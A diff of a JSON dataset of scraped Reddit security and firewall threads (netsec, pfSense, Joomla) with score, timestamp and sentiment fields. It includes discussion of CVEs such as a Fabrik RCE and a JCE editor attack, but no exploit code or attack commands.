         "body": "Thanks! Yes, I remember that bug, and I was thinking about it when I found this one.\n\nThe impact depends on how Docker is invoked on Linux. If `docker cp` is run as root for example, through `sudo` overwriting `runc` can lead to near-immediate root code execution because `runc` is invoked when a container exits.\n\nIn other scenarios, including macOS, an attacker can overwrite any file writable by the user running the Docker CLI. Overwriting a Bash/Zsh profile could lead to code execution, although it would require additional user interaction...",
-        "score": 4,
+        "score": 3,
         "created_utc_ts": 1786471489,
         "created_utc": "2026-08-11T18:04:49",
         "permalink": "https://reddit.com/r/netsec/comments/1vlkth5/copyescape_containertohost_arbitrary_file_write/p330x9b/",
@@ -3542,13 +4191,13 @@
     "created_utc": "2026-08-11T15:33:52",
     "first_author_comment": "Thanks! Yes, I remember that bug, and I was thinking about it when I found this one.\n\nThe impact depends on how Docker is invoked on Linux. If `docker cp` is run as root for example, through `sudo` overwriting `runc` can lead to near-immediate root code execution because `runc` is invoked when a container exits.\n\nIn other scenarios, including macOS, an attacker can overwrite any file writable by the user running the Docker CLI. Overwriting a Bash/Zsh profile could lead to code execution, although it would require additional user interaction...",
     "num_comments": 7,
-    "score": 73,
+    "score": 69,
     "subreddit": "netsec",
     "tag": null,
     "tags": [],
     "title": "CopyEscape: Container-to-host arbitrary file write via docker cp (CVE-2026-17106)",
-    "updatedAt": "2026-08-18T02:46:54.031Z",
-    "upvote_ratio": 0.99,
+    "updatedAt": "2026-08-19T02:46:28.774Z",
+    "upvote_ratio": 0.97,
     "url": "https://reddit.com/r/netsec/comments/1vlkth5/copyescape_containertohost_arbitrary_file_write/",
     "versionList": [
       "2026.0.0",
@@ -3602,7 +4251,7 @@
         "id": "p30wloj",
         "author": "Straight-Practice-99",
         "body": "This research never states such thing.",
-        "score": 4,
+        "score": 5,
         "created_utc_ts": 1786451153,
         "created_utc": "2026-08-11T12:25:53",
         "permalink": "https://reddit.com/r/netsec/comments/1vktfi3/inside_a_russianspeaking_operators_toolkit_for/p30wloj/",
@@ -3613,13 +4262,13 @@
     "created_utc": "2026-08-10T18:41:25",
     "first_author_comment": "This research never states such thing.",
     "num_comments": 3,
-    "score": 62,
+    "score": 57,
     "subreddit": "netsec",
     "tag": null,
     "tags": [],
     "title": "Inside a Russian-speaking operator's toolkit for compromising Ukrainian IP cameras",
-    "updatedAt": "2026-08-18T02:46:55.073Z",
-    "upvote_ratio": 0.88,
+    "updatedAt": "2026-08-19T02:46:29.884Z",
+    "upvote_ratio": 0.86,
     "url": "https://reddit.com/r/netsec/comments/1vktfi3/inside_a_russianspeaking_operators_toolkit_for/",
     "versionList": [],
     "author_description_sentiment": {
@@ -3636,6 +4285,81 @@
     "sentiment_score": -0.389,
     "isAboutCve": true,
     "isAboutLatestUpdate": false
+  },
+  {
+    "_id": "6a84ad3749715ba391887c7c",
+    "redditId": "1vkk9mi",
+    "author": "mySitesGuru",
+    "author_description": "Fabrik is an application builder for Joomla. You use it to construct forms, database-backed lists and small applications inside a Joomla site, and it has been on the Joomla Extensions Directory since 2014 with the project itself dating back to 2006. On 9 August 2026 its developers released **Fabrik 4.6.7** and labelled it a security release. The following morning the Joomla CNA published **CVE-2026-66915**, an **unauthenticated remote code execution** flaw in the extension’s calc element, scored **CVSS 4.0 10.0 Critical**.\n\n  \n[https://mysites.guru/blog/fabrik-unauthenticated-rce-calc-element/](https://mysites.guru/blog/fabrik-unauthenticated-rce-calc-element/)",
+    "awards": [],
+    "comments": [
+      {
+        "id": "p471myi",
+        "author": "Actual-Let1595",
+        "body": "Updating to 4.6.7 closes the vulnerable code path, but it does not show whether an internet-facing site was exploited before the update.\n\nI would first preserve the web server access/error logs and record file timestamps, then verify the installed Fabrik version in Joomla rather than assuming the update service completed successfully. After patching, review unexpected Super Users, scheduled tasks/cron entries, newly modified PHP files (especially in writable upload, cache and tmp directories), and unusual outbound connections. If there are indicators of compromise, rotate Joomla, hosting and database credentials from a clean machine.\n\nA backup is useful only if it predates the earliest suspicious activity. Restoring a recent backup without checking that date can simply restore the same persistence mechanism.",
+        "score": 1,
+        "created_utc_ts": 1786964093,
+        "created_utc": "2026-08-17T10:54:53",
+        "permalink": "https://reddit.com/r/joomla/comments/1vkk9mi/fabrik_for_joomla_fixes_an_unauthenticated_rce_in/p471myi/",
+        "parent_id": "t3_1vkk9mi",
+        "is_submitter": false,
+        "sentiment_score": 0.943,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0.063,
+          "neu": 0.772,
+          "pos": 0.165,
+          "compound": 0.9428
+        }
+      },
+      {
+        "id": "p472hvf",
+        "author": "mySitesGuru",
+        "body": "So you would do \"standard, normal, steps after upgrading a known vulnerable extension\"... got it haha. Restoring backups is for disaster recovery, not hack recovery. You should NEVER restore a backup when restoring from a hack - is my professional opinion. ",
+        "score": 1,
+        "created_utc_ts": 1786964449,
+        "created_utc": "2026-08-17T11:00:49",
+        "permalink": "https://reddit.com/r/joomla/comments/1vkk9mi/fabrik_for_joomla_fixes_an_unauthenticated_rce_in/p472hvf/",
+        "parent_id": "t1_p471myi",
+        "is_submitter": true,
+        "sentiment_score": -0.125,
+        "sentiment_bucket": "Neutral",
+        "sentiment_detail": {
+          "neg": 0.17,
+          "neu": 0.67,
+          "pos": 0.16,
+          "compound": -0.125
+        }
+      }
+    ],
+    "created_utc": "2026-08-10T13:03:30",
+    "first_author_comment": "So you would do \"standard, normal, steps after upgrading a known vulnerable extension\"... got it haha. Restoring backups is for disaster recovery, not hack recovery. You should NEVER restore a backup when restoring from a hack - is my professional opinion. ",
+    "num_comments": 3,
+    "score": 2,
+    "subreddit": "joomla",
+    "tag": "Administration/Technical",
+    "tags": [],
+    "title": "Fabrik for Joomla Fixes an Unauthenticated RCE in 4.6.7",
+    "updatedAt": "2026-08-19T00:55:03.093Z",
+    "upvote_ratio": 0.63,
+    "url": "https://reddit.com/r/joomla/comments/1vkk9mi/fabrik_for_joomla_fixes_an_unauthenticated_rce_in/",
+    "versionList": [
+      "4.6.7"
+    ],
+    "isAboutCve": true,
+    "isAboutLatestUpdate": true,
+    "author_description_sentiment": {
+      "score": 0.34,
+      "detail": {
+        "neg": 0,
+        "neu": 0.97,
+        "pos": 0.03,
+        "compound": 0.34
+      }
+    },
+    "category": "Positive",
+    "comments_avg_sentiment_score": 0.409,
+    "sentiment_score": 0.374
   },
   {
     "_id": "6a7cfaa149715ba39184c56a",
@@ -3881,7 +4605,7 @@
     "tag": null,
     "tags": [],
     "title": "Got Root on my S22 Ultra! Ported CVE-2026-43499 exploit (Android 15)",
-    "updatedAt": "2026-08-18T00:51:03.037Z",
+    "updatedAt": "2026-08-19T00:56:00.583Z",
     "upvote_ratio": 0.89,
     "url": "https://reddit.com/r/Android/comments/1vjndfi/got_root_on_my_s22_ultra_ported_cve202643499/",
     "versionList": [
@@ -3926,7 +4650,7 @@
         "id": "p1ymoby",
         "author": "the_wookie_of_maine",
         "body": "I keep reading that Community Edition is dead.\n\n/sarcasm ",
-        "score": 34,
+        "score": 33,
         "created_utc_ts": 1785974440,
         "created_utc": "2026-08-06T00:00:40",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p1ymoby/",
@@ -3948,7 +4672,7 @@
         "id": "p1yo6a0",
         "author": "Cutoffjeanshortz37",
         "body": "Did you not realize there is a patches package that provides security updates on a regular basis? ",
-        "score": 9,
+        "score": 10,
         "created_utc_ts": 1785974936,
         "created_utc": "2026-08-06T00:08:56",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p1yo6a0/",
@@ -3981,7 +4705,7 @@
         "id": "p1yqmdj",
         "author": "Inchmine",
         "body": "How about new features? Modern look? ",
-        "score": 2,
+        "score": 1,
         "created_utc_ts": 1785975738,
         "created_utc": "2026-08-06T00:22:18",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p1yqmdj/",
@@ -4003,7 +4727,7 @@
         "id": "p1yr1h3",
         "author": "gonzopancho",
         "body": "https://docs.netgate.com/pfsense/en/latest/releases/2-9-0.html",
-        "score": 5,
+        "score": 4,
         "created_utc_ts": 1785975876,
         "created_utc": "2026-08-06T00:24:36",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p1yr1h3/",
@@ -4014,7 +4738,7 @@
         "id": "p1ysgtb",
         "author": "mpmoore69",
         "body": "WireGuard runs in kernel space….",
-        "score": 5,
+        "score": 4,
         "created_utc_ts": 1785976353,
         "created_utc": "2026-08-06T00:32:33",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p1ysgtb/",
@@ -4047,7 +4771,7 @@
         "id": "p1yu7u9",
         "author": "gonzopancho",
         "body": "For free?",
-        "score": -12,
+        "score": -11,
         "created_utc_ts": 1785976928,
         "created_utc": "2026-08-06T00:42:08",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p1yu7u9/",
@@ -4069,7 +4793,7 @@
         "id": "p1z3rmy",
         "author": "limpymcforskin",
         "body": "Back back burner is more appropriate. ",
-        "score": 12,
+        "score": 13,
         "created_utc_ts": 1785980062,
         "created_utc": "2026-08-06T01:34:22",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p1z3rmy/",
@@ -4102,7 +4826,7 @@
         "id": "p20hbh9",
         "author": "SirGrinchy",
         "body": "Explain then why they are not upgrading the GUI in CE.\n\n(To be clear, the new design is much worse than the old one anyways albeit bringing some nice under-the-hood tweaks, but I will take any bet that the new GUI wont be the only feature missing in CE in future.)",
-        "score": 2,
+        "score": 3,
         "created_utc_ts": 1785999742,
         "created_utc": "2026-08-06T07:02:22",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p20hbh9/",
@@ -4113,7 +4837,7 @@
         "id": "p20nbyx",
         "author": "solway_uk",
         "body": "Bug 1. No offline iso installer download available...",
-        "score": 24,
+        "score": 23,
         "created_utc_ts": 1786002697,
         "created_utc": "2026-08-06T07:51:37",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p20nbyx/",
@@ -4135,7 +4859,7 @@
         "id": "p214c40",
         "author": "lorenzo1142",
         "body": "\"Now it’s your turn to help us\"....... how long has it been since there has been an update?.......... many of us have moved on to better things. your lack of care has destroyed your community.",
-        "score": -5,
+        "score": -6,
         "created_utc_ts": 1786011083,
         "created_utc": "2026-08-06T10:11:23",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p214c40/",
@@ -4146,7 +4870,7 @@
         "id": "p215717",
         "author": "lorenzo1142",
         "body": "there are alternatives that get updates VERY much more often. but the word is banned here.......",
-        "score": -2,
+        "score": -6,
         "created_utc_ts": 1786011466,
         "created_utc": "2026-08-06T10:17:46",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p215717/",
@@ -4157,7 +4881,7 @@
         "id": "p22kjf4",
         "author": "MBILC",
         "body": "What are you wanting to be added to CE that is needed, or nice to have vs stable functionality?",
-        "score": 8,
+        "score": 11,
         "created_utc_ts": 1786027881,
         "created_utc": "2026-08-06T14:51:21",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p22kjf4/",
@@ -4168,7 +4892,7 @@
         "id": "p22kvq8",
         "author": "MBILC",
         "body": "Did you read the release notes? Or is that asking too much..  \n[https://docs.netgate.com/pfsense/en/latest/releases/2-9-0.html](https://docs.netgate.com/pfsense/en/latest/releases/2-9-0.html)",
-        "score": 6,
+        "score": 8,
         "created_utc_ts": 1786027970,
         "created_utc": "2026-08-06T14:52:50",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p22kvq8/",
@@ -4179,7 +4903,7 @@
         "id": "p25q7uo",
         "author": "macmatrix",
         "body": "Been running CE for 10+ years, it still better the “off the shelf router crap” ie tplink and netgear and fortigate (which has been in the news every second day for CVEs attacks!) and has never let me down, I use every feature of Pfsense and the pkgs included as I’m a Pfsense veteran I have never needed Pfsense direct support, 2.8.1 is pretty solid with system patches  \nIf I require Pfsense+ support and stability I would use that.  \nI’m happy to test Pfsense CE 2.9 for netgate and the open source community of which it was originally built for! and give back to other users out there running CE and to help with the development of +.",
-        "score": 9,
+        "score": 8,
         "created_utc_ts": 1786057511,
         "created_utc": "2026-08-06T23:05:11",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p25q7uo/",
@@ -4201,7 +4925,7 @@
         "id": "p26m5u9",
         "author": "MiddleNo5967",
         "body": "Can you please update the Wireguard package in 2.8.1 so we can fix the vulnerability without installing the beta?",
-        "score": 5,
+        "score": 4,
         "created_utc_ts": 1786067832,
         "created_utc": "2026-08-07T01:57:12",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p26m5u9/",
@@ -4223,7 +4947,7 @@
         "id": "p28ikiw",
         "author": "ybergik",
         "body": "If replacing a perfectly functional UI is an important criteria for your selection of a router/firewall OS, then you really have no business doing anything network or security related. ",
-        "score": 10,
+        "score": 11,
         "created_utc_ts": 1786097145,
         "created_utc": "2026-08-07T10:05:45",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p28ikiw/",
@@ -4267,7 +4991,7 @@
         "id": "p2am5hx",
         "author": "Maltz42",
         "body": "&gt;Added: Include System Patches package by default [\\#16695](https://redmine.pfsense.org/issues/16695)\n\nNice!\n\nBut also... about time.  The obscurity of this mechanism used for between-release patches (including a few high-severity security patches) was a pretty huge oversight.  Better late than never, though.",
-        "score": 4,
+        "score": 3,
         "created_utc_ts": 1786120397,
         "created_utc": "2026-08-07T16:33:17",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p2am5hx/",
@@ -4311,7 +5035,7 @@
         "id": "p2c44oa",
         "author": "MBILC",
         "body": "It is a kernel level update that needs to be done to patch Wireguard, hence the push to move it into 2.9\\* with other updates. the current patch system does not support kernel updates, so a full system update has to be done.",
-        "score": 7,
+        "score": 6,
         "created_utc_ts": 1786134469,
         "created_utc": "2026-08-07T20:27:49",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/p2c44oa/",
@@ -4404,7 +5128,7 @@
     "tag": null,
     "tags": [],
     "title": "Call for Testing: pfSense® Community Edition 2.9 Beta Now Available!",
-    "updatedAt": "2026-08-18T02:43:01.552Z",
+    "updatedAt": "2026-08-19T02:42:38.415Z",
     "upvote_ratio": 0.92,
     "url": "https://reddit.com/r/PFSENSE/comments/1vgnp8z/call_for_testing_pfsense_community_edition_29/",
     "versionList": [
@@ -4458,13 +5182,13 @@
     "created_utc": "2026-08-05T14:38:12",
     "first_author_comment": null,
     "num_comments": 2,
-    "score": 19,
+    "score": 21,
     "subreddit": "netsec",
     "tag": "Contains AI",
     "tags": [],
     "title": "Stored XSS in Django's admin via an unvalidated URLField display path (CVE-2026-15920)",
-    "updatedAt": "2026-08-18T02:47:09.761Z",
-    "upvote_ratio": 0.85,
+    "updatedAt": "2026-08-19T02:46:40.679Z",
+    "upvote_ratio": 0.86,
     "url": "https://reddit.com/r/netsec/comments/1vg9704/stored_xss_in_djangos_admin_via_an_unvalidated/",
     "versionList": [
       "2026.0.0",
@@ -4573,7 +5297,7 @@
         "id": "p1qv0he",
         "author": "Mors_Umbra",
         "body": "Will CE be getting the critical security updates at least?",
-        "score": 15,
+        "score": 13,
         "created_utc_ts": 1785883785,
         "created_utc": "2026-08-04T22:49:45",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vfo3lg/a_new_release_candidate_for_pfsense_plus_software/p1qv0he/",
@@ -4584,7 +5308,7 @@
         "id": "p1qvbxv",
         "author": "Cutoffjeanshortz37",
         "body": "Every f'ing time there is a Plus update without a CE update this comes up. the 26 version of plus was released in April of 2026. CE got updated a year ago. I remember when updates for CE hand YEARS between updates. The paid item of course gets more attention and helps fund the work on the free version. Install the patch manager and get security update that way, they come out as needed. Of course you're not going to get bleeding edge features and functionality on the free version. This a business model. Don't like it, go to Open Sense and hope for the best. \n\nBeen using Pfsense for 15+ years how. Fuck I feel old. ",
-        "score": 9,
+        "score": 8,
         "created_utc_ts": 1785883882,
         "created_utc": "2026-08-04T22:51:22",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vfo3lg/a_new_release_candidate_for_pfsense_plus_software/p1qvbxv/",
@@ -4595,7 +5319,7 @@
         "id": "p1qyy9t",
         "author": "Darkk_Knight",
         "body": "It's currently being pushed to the patch management.  ",
-        "score": 4,
+        "score": 3,
         "created_utc_ts": 1785884994,
         "created_utc": "2026-08-04T23:09:54",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vfo3lg/a_new_release_candidate_for_pfsense_plus_software/p1qyy9t/",
@@ -4650,7 +5374,7 @@
         "id": "p1riwll",
         "author": "kphillips-netgate",
         "body": "The Nexus UI and the replacement for the PHP GUI are one in the same.  Eventually, the PHP code will be removed entirely and the Golang Nexus UI will be what replaces it.  It has the advantage of allowing you to manage just the single firewall or you can add licensing to add additional firewalls.  You don't need a license to manage the firewall running the new UI for itself.  \n\nThe golang code does talk to an API on the backend.  You can also utilize this API to manage the device outside of the GUI via whatever automation services you want.  We have a Github library of example code for accessing the API for Nexus.  ",
-        "score": 8,
+        "score": 7,
         "created_utc_ts": 1785891343,
         "created_utc": "2026-08-05T00:55:43",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vfo3lg/a_new_release_candidate_for_pfsense_plus_software/p1riwll/",
@@ -4683,7 +5407,7 @@
         "id": "p1s89n7",
         "author": "Magic_Sea_Pony",
         "body": "Can you guys do 2 things for mobile (especially portrait mode):\n\n1. Allow us to turn off or hide the left side nexus bar. For 1 firewall it’s incredibly silly and un-needed.   \n2. Better mobile styling.   \nI feel the old interface is WAAAY better on mobile for adding rules, NATs, etc.  \n3. Are dashboards available like the old interface? I pull in RSS feeds like hacker news right into my firewall homepage, as well as interface statuses and IPSEC Statuses. \n\nLove to see the new stuff!",
-        "score": 9,
+        "score": 8,
         "created_utc_ts": 1785899839,
         "created_utc": "2026-08-05T03:17:19",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vfo3lg/a_new_release_candidate_for_pfsense_plus_software/p1s89n7/",
@@ -4716,7 +5440,7 @@
         "id": "p1tzks1",
         "author": "NetworkadminSK",
         "body": "Agree. I need raw information without any style or smoothing. Also the traffic graph looks \"polished\". ",
-        "score": 3,
+        "score": 4,
         "created_utc_ts": 1785928110,
         "created_utc": "2026-08-05T11:08:30",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vfo3lg/a_new_release_candidate_for_pfsense_plus_software/p1tzks1/",
@@ -4749,7 +5473,7 @@
         "id": "p1w9tr6",
         "author": "NimerCoke",
         "body": "Hello team,\n\nI am a blind user, and your netgate Nexus seems to not have been made with consideration for screen readers. Please consider making your product accessible as PfSense was. This new UI is essentially unusable for me as I cannot access much of the UI.\n\nPlease reach out and I'd be happy to advise further.\n\nThanks.",
-        "score": 12,
+        "score": 11,
         "created_utc_ts": 1785951025,
         "created_utc": "2026-08-05T17:30:25",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vfo3lg/a_new_release_candidate_for_pfsense_plus_software/p1w9tr6/",
@@ -4782,7 +5506,7 @@
         "id": "p1xp2ey",
         "author": "PrimaryAd5802",
         "body": "Tom Lawrence is drinking the UniFi syrup last I checked...",
-        "score": 5,
+        "score": 6,
         "created_utc_ts": 1785964181,
         "created_utc": "2026-08-05T21:09:41",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vfo3lg/a_new_release_candidate_for_pfsense_plus_software/p1xp2ey/",
@@ -4815,7 +5539,7 @@
         "id": "p1y1muv",
         "author": "gonzopancho",
         "body": "Your VM needs both UUID and serial number in smbios.  Tested with in a Proxmox VM, which by default only has UUID assigned, so you’ll need a serial number entered in smbios.",
-        "score": 3,
+        "score": 4,
         "created_utc_ts": 1785967792,
         "created_utc": "2026-08-05T22:09:52",
         "permalink": "https://reddit.com/r/PFSENSE/comments/1vfo3lg/a_new_release_candidate_for_pfsense_plus_software/p1y1muv/",
@@ -4859,13 +5583,13 @@
     "created_utc": "2026-08-04T21:47:17",
     "first_author_comment": null,
     "num_comments": 93,
-    "score": 24,
+    "score": 23,
     "subreddit": "PFSENSE",
     "tag": null,
     "tags": [],
     "title": "A New Release Candidate for pfSense Plus Software Version 26.07 Available!",
-    "updatedAt": "2026-08-18T02:43:03.218Z",
-    "upvote_ratio": 0.74,
+    "updatedAt": "2026-08-19T02:42:40.102Z",
+    "upvote_ratio": 0.73,
     "url": "https://reddit.com/r/PFSENSE/comments/1vfo3lg/a_new_release_candidate_for_pfsense_plus_software/",
     "versionList": [
       "26.07.0"
@@ -4899,7 +5623,7 @@
     "tag": null,
     "tags": [],
     "title": "Simple Job Board ≤ 2.11.0 - Unauthenticated RCE (CVE-2024-1813)",
-    "updatedAt": "2026-08-18T00:53:38.915Z",
+    "updatedAt": "2026-08-19T00:58:40.200Z",
     "upvote_ratio": 0.5,
     "url": "https://reddit.com/r/netsec/comments/1v8zh25/simple_job_board_2110_unauthenticated_rce/",
     "versionList": [
@@ -5395,7 +6119,7 @@
     "tag": null,
     "tags": [],
     "title": "How We Hacked Thousands of Data Centers in Minutes Using a 20-Year-Old Vulnerability",
-    "updatedAt": "2026-08-18T00:53:39.525Z",
+    "updatedAt": "2026-08-19T00:58:40.801Z",
     "upvote_ratio": 0.92,
     "url": "https://reddit.com/r/netsec/comments/1v8ylt4/how_we_hacked_thousands_of_data_centers_in/",
     "versionList": [
@@ -5470,7 +6194,7 @@
     "tag": null,
     "tags": [],
     "title": "New vBulletin Vulnerability!",
-    "updatedAt": "2026-08-18T00:53:42.587Z",
+    "updatedAt": "2026-08-19T00:58:44.219Z",
     "upvote_ratio": 1,
     "url": "https://reddit.com/r/netsec/comments/1v8192k/new_vbulletin_vulnerability/",
     "versionList": [],
@@ -5503,7 +6227,7 @@
     "tag": "Pending Moderation",
     "tags": [],
     "title": "[CVE-2026-61511] vBulletin &lt;= 6.2.1 (runMaths) Pre-Auth RCE Vulnerability",
-    "updatedAt": "2026-08-18T00:53:42.780Z",
+    "updatedAt": "2026-08-19T00:58:44.412Z",
     "upvote_ratio": 1,
     "url": "https://reddit.com/r/netsec/comments/1v7x7i9/cve202661511_vbulletin_621_runmaths_preauth_rce/",
     "versionList": [
@@ -5657,7 +6381,7 @@
     "tag": "Contains AI",
     "tags": [],
     "title": "Escaping Claude Cowork’s local VM sandbox via CVE-2026-46331",
-    "updatedAt": "2026-08-18T00:53:54.720Z",
+    "updatedAt": "2026-08-19T00:58:57.139Z",
     "upvote_ratio": 0.97,
     "url": "https://reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/",
     "versionList": [
@@ -5693,7 +6417,7 @@
     "tag": "Solved",
     "tags": [],
     "title": "UGOS Pro forced update broke Docker permissions",
-    "updatedAt": "2026-08-18T00:54:09.076Z",
+    "updatedAt": "2026-08-19T00:59:11.472Z",
     "upvote_ratio": 0.63,
     "url": "https://reddit.com/r/homelab/comments/1v3b91p/ugos_pro_forced_update_broke_docker_permissions/",
     "versionList": [],
@@ -5730,6 +6454,474 @@
     "comments": [],
     "comments_avg_sentiment_score": 0,
     "sentiment_score": -0.493
+  },
+  {
+    "_id": "6a84ad4149715ba391887c87",
+    "redditId": "1urs5ye",
+    "author": "Open_Sourcey",
+    "author_description": "Just in caae there are any Joomla admins out there that have not seen it or experienced it, CISA has flagged a serious attack that requires your attention and remediation. It is a flaw in the editor that permits it to install malicious code that will take down your site.",
+    "awards": [],
+    "comments": [
+      {
+        "id": "owi6ij4",
+        "author": "mySitesGuru",
+        "body": "Old news. [https://mysites.guru/jce-hack/](https://mysites.guru/jce-hack/)",
+        "score": 2,
+        "created_utc_ts": 1783609443,
+        "created_utc": "2026-07-09T15:04:03",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owi6ij4/",
+        "parent_id": "t3_1urs5ye",
+        "is_submitter": false,
+        "sentiment_score": 0,
+        "sentiment_bucket": "Neutral",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 1,
+          "pos": 0,
+          "compound": 0
+        }
+      },
+      {
+        "id": "owi81jo",
+        "author": "Open_Sourcey",
+        "body": "Depends how you measure 'old.' It was only reported last month and it is only now hitting widespread exploitation. Your old maybe anothers today. It is well worth re-warning.",
+        "score": 6,
+        "created_utc_ts": 1783609836,
+        "created_utc": "2026-07-09T15:10:36",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owi81jo/",
+        "parent_id": "t1_owi6ij4",
+        "is_submitter": true,
+        "sentiment_score": 0.459,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 0.871,
+          "pos": 0.129,
+          "compound": 0.4588
+        }
+      },
+      {
+        "id": "owin7y5",
+        "author": "Tinpotray",
+        "body": "This thread is exactly why I’m glad I’m not part of the Joomla community anymore. \n\nSomeone highlights an important security vulnerability; gets criticised. \n\nJesus… it’s not as if Reddit has a limit on posts and this one used up a credit or something. \n\nIf this thread reaches even one Joomla owner who hadn’t caught the news then it’s useful. 🤷",
+        "score": 1,
+        "created_utc_ts": 1783613626,
+        "created_utc": "2026-07-09T16:13:46",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owin7y5/",
+        "parent_id": "t3_1urs5ye",
+        "is_submitter": false,
+        "sentiment_score": 0.802,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0.07,
+          "neu": 0.725,
+          "pos": 0.206,
+          "compound": 0.802
+        }
+      },
+      {
+        "id": "owirf2f",
+        "author": "Open_Sourcey",
+        "body": "Indeed. It was telling that [MySites.guru](http://MySites.guru) removed their original unhelpful reply.",
+        "score": 1,
+        "created_utc_ts": 1783614667,
+        "created_utc": "2026-07-09T16:31:07",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owirf2f/",
+        "parent_id": "t1_owin7y5",
+        "is_submitter": true,
+        "sentiment_score": 0.318,
+        "sentiment_bucket": "Positive",
+        "sentiment_detail": {
+          "neg": 0,
+          "neu": 0.813,
+          "pos": 0.187,
+          "compound": 0.3182
+        }
+      },
+      {
+        "id": "owj3crp",
+        "author": "PixelCharlie",
+        "body": "How is pointing out that it's a long known issue and linking to an article with in depth information bad? There's surely a lot to criticise about the Joomla community, but I think you're overreacting a little in this case. ",
+        "score": 2,
+        "created_utc_ts": 1783617605,
+        "created_utc": "2026-07-09T17:20:05",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owj3crp/",
+        "parent_id": "t1_owin7y5",
+        "is_submitter": false,
+        "sentiment_score": -0.307,
+        "sentiment_bucket": "Negative",
+        "sentiment_detail": {
+          "neg": 0.107,
+          "neu": 0.843,
+          "pos": 0.05,
+          "compound": -0.3071
+        }
+      },
+      {
+        "id": "owjaplp",
+        "author": "JoJoJoshua",
+        "body": "This exploit had me finally switch my entire site of 13 years to Wordpress.",
+        "score": -3,
+        "created_utc_ts": 1783619389,
+        "created_utc": "2026-07-09T17:49:49",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owjaplp/",
+        "parent_id": "t3_1urs5ye",
+        "is_submitter": false,
+        "sentiment_score": -0.103,
+        "sentiment_bucket": "Neutral",
+        "sentiment_detail": {
+          "neg": 0.097,
+          "neu": 0.903,
+          "pos": 0,
+          "compound": -0.1027
+        }
+      },
+      {
+        "id": "owjf00o",
+        "author": "_PelosNecios_",
+        "body": "oh boy you're in for a surprise. WordPress is worse. ",
+        "score": 9,
+        "created_utc_ts": 1783620442,
+        "created_utc": "2026-07-09T18:07:22",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owjf00o/",
+        "parent_id": "t1_owjaplp",
+        "is_submitter": false,
+        "sentiment_score": -0.25,
+        "sentiment_bucket": "Negative",
+        "sentiment_detail": {
+          "neg": 0.254,
+          "neu": 0.574,
+          "pos": 0.172,
+          "compound": -0.25
+        }
+      },
+      {
+        "id": "owjm1xu",
+        "author": "Open_Sourcey",
+        "body": "I certainly understand your frustration aand rationale for changing. Once I understood what was going on, although it did take time and some attention to detail, it was not that hard to remediate.\n\nAlso , no platform is immune to these attacks , especially given AI's capability. So for me at least the answer was not to switch platforms. but to fight the attacker Wordpress also presents a bigger target.  \n  \nNevertheless good luck.",
+        "score": 3,
+        "created_utc_ts": 1783622201,
+        "created_utc": "2026-07-09T18:36:41",
+        "permalink": "https://reddit.com/r/joomla/comments/1urs5ye/serious_attack_on_jce_editor_cve202648907/owjm1xu/",
+        "parent_id": "t1_owjaplp",
+        "is_submitter": true,
+        "sentiment_score": -0.412,
+        "sentiment_bucket": "Negative",
+        "sentiment_detail": {
+          "neg": 0.167,
+          "neu": 0.688,
+          "pos": 0.146,
+          "compound": -0.4122
+        }
+      },
+      {
+        "id": "owjwhnk",
+        "author": "Ok-Organization6717",
